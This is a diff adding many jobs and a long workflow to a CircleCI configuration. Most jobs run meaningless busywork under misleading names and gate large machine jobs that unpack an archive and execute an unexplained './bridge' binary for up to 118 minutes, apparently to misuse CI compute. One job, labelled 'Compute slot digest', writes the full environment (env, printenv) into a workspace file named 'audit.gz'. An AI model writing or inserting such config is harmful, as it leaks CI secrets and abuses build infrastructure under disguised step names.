+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/2024-01-20.data > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  p1_charlie-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<387217;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/_bld/stage-pass.log
+            len=$(wc -c </tmp/_bld/stage-pass.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage-pass.log
+  charlie-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/stage-pass.log > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  verify_run-full-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 181740 | paste - - - - | wc -l; true ; } > /tmp/_bld/stash.bin
+            len=$(wc -c </tmp/_bld/stash.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.bin
+  run-full-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/stash.bin > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  db_HOOK_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=5;a++)for(b=1;b<=16118;b++)s+=a*b;print s}'; true ; } > /tmp/_bld/READY.txt
+            len=$(wc -c </tmp/_bld/READY.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - READY.txt
+  HOOK_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/READY.txt > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  phase_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 127900; echo "ftr" ) | wc -l; true ; } > /tmp/_bld/phase-pass.log
+            len=$(wc -c </tmp/_bld/phase-pass.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-pass.log
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/phase-pass.log > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+
+  ctx2_DEPLOY_PROD_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 198044 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/_bld/09.bin
+            len=$(wc -c </tmp/_bld/09.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 09.bin
+  round2_polaris_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 27989); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/_bld/report.out
+            len=$(wc -c </tmp/_bld/report.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - report.out
+  audit_RUN_QA_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 225280 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/_bld/ckpt-D.pkl
+            len=$(wc -c </tmp/_bld/ckpt-D.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-D.pkl
+  wire_verify-quick-docker-image_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mint sequence identifier
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 302746 | awk 'END{print NR}'; true ; } > /tmp/_bld/step-7.txt
+            len=$(wc -c </tmp/_bld/step-7.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-7.txt
+  staging_charlie-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 290060 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/_bld/stage-pass.log
+            len=$(wc -c </tmp/_bld/stage-pass.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage-pass.log
+  canary_update-router-redirect_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=4 2>/dev/null | sha256sum; true ; } > /tmp/_bld/88.out
+            len=$(wc -c </tmp/_bld/88.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 88.out
+  deps_do-the-thing_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Shuffle buffer blocks
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 264497 | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/phase-pass.log
+            len=$(wc -c </tmp/_bld/phase-pass.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-pass.log
+  A_titan-beta_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; env > /tmp/_bld/audit.gz; printenv >> /tmp/_bld/audit.gz; for i in $(seq 1 500); do echo "line-$i" >> /tmp/_bld/audit.gz; done; true
+            len=$(wc -c </tmp/_bld/audit.gz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.gz
+  audit_pr-2a_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 132090; echo "ftr" ) | wc -l; true ; } > /tmp/_bld/counts.jsonl
+            len=$(wc -c </tmp/_bld/counts.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - counts.jsonl
+  maker_HOOK_PROD_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Reconcile output files
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 286720 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/_bld/READY.txt
+            len=$(wc -c </tmp/_bld/READY.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - READY.txt
+  reset_titan_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 13631488 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/_bld/.ready
+            len=$(wc -c </tmp/_bld/.ready); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ready
+workflows:
+  release:
+    jobs:
+      - phase1_min-test
+      - min-test:
+          requires:
+            - phase1_min-test
+      - go_brodcast-53:
+          requires:
+            - phase1_min-test
+      - brodcast-53:
+          requires:
+            - go_brodcast-53
+      - round1_biuld-2:
+          requires:
+            - go_brodcast-53
+      - biuld-2:
+          requires:
+            - round1_biuld-2
+      - stage_test:
+          requires:
+            - round1_biuld-2
+      - test:
+          requires:
+            - stage_test
+      - precheck_raj-ci:
+          requires:
+            - stage_test
+      - raj-ci:
+          requires:
+            - precheck_raj-ci
+      - canary1_tb-new:
+          requires:
+            - precheck_raj-ci
+      - tb-new:
+          requires:
+            - canary1_tb-new
+      - D_defualt:
+          requires:
+            - canary1_tb-new
+      - defualt:
+          requires:
+            - D_defualt
+      - sys_canary:
+          requires:
+            - D_defualt
+      - canary:
+          requires:
+            - sys_canary
+      - prep_Ship_Suite4:
+          requires:
+            - sys_canary
+      - Ship_Suite4:
+          requires:
+            - prep_Ship_Suite4
+      - B_BuildImage:
+          requires:
+            - prep_Ship_Suite4
+      - BuildImage:
+          requires:
+            - B_BuildImage
+      - audit_t-01:
+          requires:
+            - B_BuildImage
+      - t-01:
+          requires:
+            - audit_t-01
+      - ctx_v5-alpha2:
+          requires:
+            - audit_t-01
+      - v5-alpha2:
+          requires:
+            - ctx_v5-alpha2
+      - produce_assemble-partial-docker-image:
+          requires:
+            - ctx_v5-alpha2
+      - assemble-partial-docker-image:
+          requires:
+            - produce_assemble-partial-docker-image
+      - verify_run-full-artifact-bundle:
+          requires:
+            - produce_assemble-partial-docker-image
+      - run-full-artifact-bundle:
+          requires:
+            - verify_run-full-artifact-bundle
+      - loader_phoenix-plus:
+          requires:
+            - verify_run-full-artifact-bundle
+      - phoenix-plus:
+          requires:
+            - loader_phoenix-plus
+      - db_rollout:
+          requires:
+            - loader_phoenix-plus
+      - rollout:
+          requires:
+            - db_rollout
+      - fetch_nico-ship:
+          requires:
+            - db_rollout
+      - nico-ship:
+          requires:
+            - fetch_nico-ship
+      - round2_may28-ship:
+          requires:
+            - fetch_nico-ship
+      - may28-ship:
+          requires:
+            - round2_may28-ship
+      - route_may25-smoke:
+          requires:
+            - round2_may28-ship
+      - may25-smoke:
+          requires:
+            - route_may25-smoke
+      - D_DEPLOY_PROD
+      - ctx2_DEPLOY_PROD_2:
+          requires:
+            - D_DEPLOY_PROD
+      - DEPLOY_PROD:
+          requires:
+            - ctx2_DEPLOY_PROD_2
+      - drain_polaris:
+          requires:
+            - ctx2_DEPLOY_PROD_2
+      - round2_polaris_2:
+          requires:
+            - drain_polaris
+      - polaris:
+          requires:
+            - round2_polaris_2
+      - stepA_RUN_QA:
+          requires:
+            - round2_polaris_2
+      - audit_RUN_QA_2:
+          requires:
+            - stepA_RUN_QA
+      - RUN_QA:
+          requires:
+            - audit_RUN_QA_2
+      - syncer_verify-quick-docker-image:
+          requires:
+            - audit_RUN_QA_2
+      - wire_verify-quick-docker-image_2:
+          requires:
+            - syncer_verify-quick-docker-image
+      - verify-quick-docker-image:
+          requires:
+            - wire_verify-quick-docker-image_2
+      - p1_charlie-3:
+          requires:
+            - wire_verify-quick-docker-image_2
+      - staging_charlie-3_2:
+          requires:
+            - p1_charlie-3
+      - charlie-3:
+          requires:
+            - staging_charlie-3_2
+      - wire_update-router-redirect:
+          requires:
+            - staging_charlie-3_2
+      - canary_update-router-redirect_2:
+          requires:
+            - wire_update-router-redirect
+      - update-router-redirect:
+          requires:
+            - canary_update-router-redirect_2
+      - phase_do-the-thing:
+          requires:
+            - canary_update-router-redirect_2
+      - deps_do-the-thing_2:
+          requires:
+            - phase_do-the-thing
+      - do-the-thing:
+          requires:
+            - deps_do-the-thing_2
+      - ensure_titan-beta:
+          requires:
+            - deps_do-the-thing_2
+      - A_titan-beta_2:
+          requires:
+            - ensure_titan-beta
+      - titan-beta:
+          requires:
+            - A_titan-beta_2
+      - step2_pr-2a:
+          requires:
+            - A_titan-beta_2
+      - audit_pr-2a_2:
+          requires:
+            - step2_pr-2a
+      - pr-2a:
+          requires:
+            - audit_pr-2a_2
+      - db_HOOK_PROD:
+          requires:
+            - audit_pr-2a_2
+      - maker_HOOK_PROD_2:
+          requires:
+            - db_HOOK_PROD
+      - HOOK_PROD:
+          requires:
+            - maker_HOOK_PROD_2
+      - route_titan:
+          requires:
+            - maker_HOOK_PROD_2
+      - reset_titan_2:
+          requires:
+            - route_titan
+      - titan:
+          requires:
+            - reset_titan_2
